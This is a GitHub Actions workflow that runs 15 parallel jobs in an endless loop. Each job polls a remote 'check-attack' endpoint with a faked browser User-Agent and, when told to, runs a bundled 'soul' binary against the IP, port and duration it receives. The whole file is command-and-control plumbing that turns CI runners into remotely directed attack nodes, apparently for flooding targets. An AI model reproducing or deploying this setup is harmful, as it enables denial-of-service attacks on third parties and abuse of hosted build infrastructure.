name: Poll and Execute Soul

on:
  workflow_dispatch:
  schedule:
    - cron: '0 0 * * *'  # Restart daily at 5:30 AM IST

jobs:
  execute-soulcracks:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        session: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
      max-parallel: 15
      fail-fast: false
    steps:
      - uses: actions/checkout@v4
      - name: Debug directory structure
        run: |
          echo "Listing repository contents:"
          ls -la
          echo "Checking for soulcracks binary:"
          find . -name soul || echo "soul binary not found"
      - name: Make binary executable
        run: |
          if [ -f soul ]; then
            chmod +x soul
            echo "Set permissions for soul"
          else
            echo "Error: soulcracks binary not found"
            exit 1
          fi
      - name: Poll API and execute soul
        run: |
          echo "Session ${{ matrix.session }} polling..."
          while true; do
            RESPONSE=$(curl -s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" https://galaxyshop.tech/daksh/check-attack.php)
            EXECUTE=$(echo $RESPONSE | jq -r '.execute')
            IP=$(echo $RESPONSE | jq -r '.ip')
            PORT=$(echo $RESPONSE | jq -r '.port')
            TIME=$(echo $RESPONSE | jq -r '.duration')
            if [ "$EXECUTE" = "true" ]; then
              echo "Session ${{ matrix.session }} executing soul..."
              ./soul "$IP" "$PORT" "$TIME"
              echo "Session ${{ matrix.session }} done"
            else
              echo "Session ${{ matrix.session }} waiting..."
            fi
            sleep 10
          done
